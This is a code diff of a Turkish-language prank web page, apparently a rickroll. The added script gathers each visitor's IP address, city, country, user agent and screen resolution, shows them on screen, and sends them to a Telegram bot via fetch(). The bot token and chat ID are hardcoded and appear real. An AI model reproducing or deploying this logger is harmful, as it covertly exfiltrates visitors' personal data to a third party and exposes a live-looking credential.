@@ -86,8 +86,8 @@
     }
 
     async function sendToTelegram(message) {
-      const chatId = "6400737507";  // Chat ID (örnek: 123456789)
-      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Bot Token (örnek: 123456:ABC...XYZ)
+      const chatId = "6400737507"; // Kendi chat ID’in
+      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Kendi bot token’in
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
       await fetch(url, {
@@ -114,4 +114,18 @@
         await typeText(`Tarayıcı: ${navigator.userAgent}`);
         await typeText(`Ekran: ${screen.width}x${screen.height}`);
 
-        const
+        const message = `YENİ GİRİŞ:\nIP: ${data.ip}\nŞehir: ${data.city}\nÜlke: ${data.country_name}\nTarayıcı: ${navigator.userAgent}\nÇözünürlük: ${screen.width}x${screen.height}`;
+
+        await sendToTelegram(message);
+      } catch (e) {
+        await typeText("Veri alınırken bir hata oluştu.");
+      }
+
+      await new Promise(r => setTimeout(r, 1000));
+      rickButton.style.display = 'block';
+    }
+
+    showInfo();
+  </script>
+</body>
+</html>
